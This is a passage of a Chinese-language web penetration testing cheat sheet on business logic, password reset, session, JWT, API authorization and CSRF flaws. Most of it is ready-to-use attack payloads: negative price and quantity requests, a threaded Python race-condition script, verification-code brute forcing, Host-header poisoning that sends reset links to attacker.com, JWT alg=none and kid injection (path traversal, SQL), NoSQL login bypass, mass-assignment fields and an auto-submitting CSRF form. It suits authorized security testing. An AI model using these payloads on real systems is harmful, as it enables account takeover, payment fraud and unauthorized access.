{"product_id":123,"quantity":-1,"price":99.99}      # 负数量 → 退钱
{"product_id":123,"quantity":1,"price":-99.99}      # 负价格 → 账户加钱
```

---

### 4.2 优惠券/折扣滥用

```http

---

# 优惠码叠加/重复使用
POST /api/apply-coupon
{"code":"NEWUSER50"}           # → 使用多次

---

# 负数折扣
{"code":"NEWUSER50","amount":-50}

---

# 高比例折扣叠加
{"code":"NEWUSER10","code":"VIP20","code":"SALE30"}
```

---

### 4.3 竞态条件

```bash

---

# 余额/库存竞态

---

# 初始余额: 100元

---

# 同时发起多个 100元提现请求 → 余额检查都通过 → 提现200元

---

# Burp Intruder / Turbo Intruder:

---

# 20并发请求 → 看是否都成功

---

# Python 并发验证:
import threading, requests
def checkout():
    s = requests.Session()
    s.post("https://target.com/api/checkout", json={"product_id":1,"quantity":1})
for i in range(20):
    threading.Thread(target=checkout).start()
```

---

---

## 5. 密码重置漏洞

---

### 5.1 验证码爆破

```bash

---

# 4位/6位验证码 → 爆破
POST /api/verify-reset-code
{"phone":"13800138000","code":"0000"} → ... → "9999"

---

# Burp Intruder: Numbers payload, 0000-9999

---

# 注意: 通常有频率限制 + 次数限制(5次)
```

---

### 5.2 Token 泄露/可预测

```
Token 在响应中返回:
GET /api/reset-password?phone=13800138000
→ {"token":"abc123"}   ← 直接在响应里

Token 在 Referer 中:
POST /api/reset-password
Referer: https://target.com/reset?token=abc123

Token 可预测:
- 基于时间戳: new Date().getTime()
- 基于用户名: MD5(username)
- 基于递增ID: 001 → 002 → 003
```

---

### 5.3 任意用户密码重置

```http

---

# 修改手机号/邮箱参数
POST /api/reset-password
{"phone":"13800138000","new_password":"hacked123"}

---

# 尝试加目标用户标识:
{"user_id":1,"phone":"13800138000","new_password":"hacked123"}
{"target_user":"admin","phone":"13800138000","new_password":"hacked123"}

---

# Host 头投毒 → 重置链接发到攻击者服务器
POST /api/forgot-password
Host: attacker.com
{"email":"admin@target.com"}
→ 目标收到链接: https://attacker.com/reset?token=xxx
```

---

---

## 6. 会话管理漏洞

---

### 6.1 Session Fixation

```
1. 访问目标站 → 获取 Session ID: abc123
2. 构造链接: https://target.com/login?PHPSESSID=abc123
3. 发给受害者 → 受害者用此链接登录
4. 攻击者用 Session ID abc123 → 直接以受害者身份登录
```

---

### 6.2 Token 未失效

```bash

---

# 登出后 Token 仍有效

---

# 1. 登录 → 获取 JWT

---

# 2. 登出

---

# 3. 用旧 JWT 访问 → 200 OK → Token 未失效

---

# 密码修改后 Token 仍有效

---

# 1. 登录 → 获取 Token

---

# 2. 修改密码

---

# 3. 旧 Token 仍然可访问 → Token 未失效
```

---

### 6.3 弱 Token 生成

```
JWT secret: "secret" / "password" / "changeme"
→ jwt_tool 爆破

Session ID 可预测:
- 基于 base64(username+timestamp) → 计算他人 session
- 基于递增序列 → 遍历

---

# jwt_tool:
python3 jwt_tool.py <JWT> -C -d rockyou.txt
```

---

### 6.4 JWT 算法攻击

```bash

---

# === alg=none ===

---

# header 改为 {"alg":"none"}，签名段置空 → payload.role 改 admin 后重放

---

# 验证: 用篡改 Token 访问管理接口成功才算（仅接受 none 但无越权 → 不报）

---

# === RS256 → HS256 混淆 ===

---

# 服务端用公钥验证 HS256 → 拿公钥当 HMAC 密钥自签
python3 jwt_tool.py <JWT> -S hs256 -k public.pem

---

# === kid 注入 ===

---

# header.kid 被拼进文件路径/SQL → 指向可控文件或注入
{"alg":"HS256","kid":"../../../../dev/null"}        # 空密钥签名
{"alg":"HS256","kid":"x' UNION SELECT 'secret'--"}  # SQL 注入取密钥

---

# 自动化: jwt_tool -T (篡改) / hashcat -m 16500 (HS256 爆破)
```

---

---

## 7. API 鉴权绕过

---

### 7.1 常见模式

```bash

---

# === 参数覆盖 ===
POST /api/user/profile
{"user":"attacker"}
&user=admin    → 后端可能取最后一个参数

---

# === 数组注入 ===
{"role":["user","admin"]}     → 后端取 role[0] 但校验 role
{"role":"user","role":"admin"} → PHP 只取最后一个 = admin

---

# === NoSQL 注入鉴权 ===
POST /api/login
{"username":{"$ne":null},"password":{"$ne":null}}

---

# MongoDB → 匹配任意用户

---

# === GraphQL 内省 → 发现隐藏接口 ===
POST /graphql
{"query":"{ __schema { types { name fields { name } } } }"}
```

---

### 7.2 Mass Assignment (批量赋值)

```http
POST /api/register HTTP/1.1

---

# 原始:
{"username":"test","password":"test123"}

---

# 尝试注入额外字段:
{"username":"test","password":"test123","isAdmin":true}
{"username":"test","password":"test123","role":"admin"}
{"username":"test","password":"test123","approved":true}
{"username":"test","password":"test123","email_verified":true}
```

---

---

## 8. CSRF (跨站请求伪造)

> 报告门槛：仅**敏感操作**（改密码/改邮箱/绑定手机/转账/加管理员/删数据）且无有效 Token/Referer 校验时才算。登录 CSRF、登出 CSRF、只读操作 CSRF → 不报。

---

### 8.1 检测方法

```
1. 抓敏感操作请求 → 检查有无 CSRF Token / 自定义头校验
2. 无 Token → 删除 Referer 后重放 → 仍成功 = 存在 CSRF
3. 有 Token → 测试: 删除 Token 是否仍通过 / 换他人 Token / Token 与 Session 不绑定 / 能否用 GET 触发
```

---

### 8.2 PoC 模板

```html
<!-- 基础表单 PoC（以改密码为例，验证时改无害字段如昵称） -->
<html><body onload="document.forms[0].submit()">
<form action="https://target.com/user/changePwd" method="POST">
  <input type="hidden" name="newPwd" value="hacked123">
</form></body></html>

<!-- JSON 接口 CSRF（Content-Type 变形试探后端宽容解析） -->
<script>
fetch('https://target.com/api/changeEmail', {
  method: 'POST', credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"test@example.com"}'
})
</script>
```

---

### 8.3 防护绕过

- Referer 校验 → `<meta name="referrer" content="never">` 置空 / 域名包含绕过 `target.com.evil.com`
- Token 弱校验 → 可预测 / 不校验存在性 / 与 Session 不绑定
- SameSite=Lax → 寻找 GET 可触发的敏感操作；SameSite=None+Secure → 直接跨站可用

---

### 8.4 CSWSH (WebSocket 劫持)

WebSocket 握手仅靠 Cookie 认证且无 Origin 校验 → 等同 CSRF。
测试: 跨域页面执行 `new WebSocket('wss://target.com/ws')`，能建立连接并收到数据 = 可劫持。

---

---

## 相关参考
- 竞争条件绕过业务逻辑 → `logic-race.md`

*参考: OWASP IDOR + PortSwigger Access Control + 实战案例*